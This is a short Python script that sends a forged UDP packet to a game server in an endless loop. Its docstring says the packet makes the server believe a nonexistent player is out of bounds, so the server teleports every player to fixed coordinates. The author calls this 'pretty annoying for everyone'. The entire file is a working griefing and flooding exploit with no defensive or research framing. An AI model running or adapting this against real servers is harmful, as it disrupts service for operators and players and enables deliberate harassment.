import socket

SERVER_IP = "" # ip
SERVER_PORT = 0 # port

def sendpkt():
    '''
        Basically makes the server think that some user that doesn't exist is stuck in the map,
        in a spot that is out of bounds. For some reason the server iterates through each player
        checking their coordinates and then teleporting them to 0.998, 0.112, 0.44.
      
        Pretty annoying for everyone LOL
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bytes("\x00--PAGE--\r\nx,y,z,0.8888888,0.2222222,0.f", "utf-8"), (SERVER_IP, SERVER_PORT))
  

def main():
    while 1:
        sendpkt()

if __name__ == "__main__":
    main()
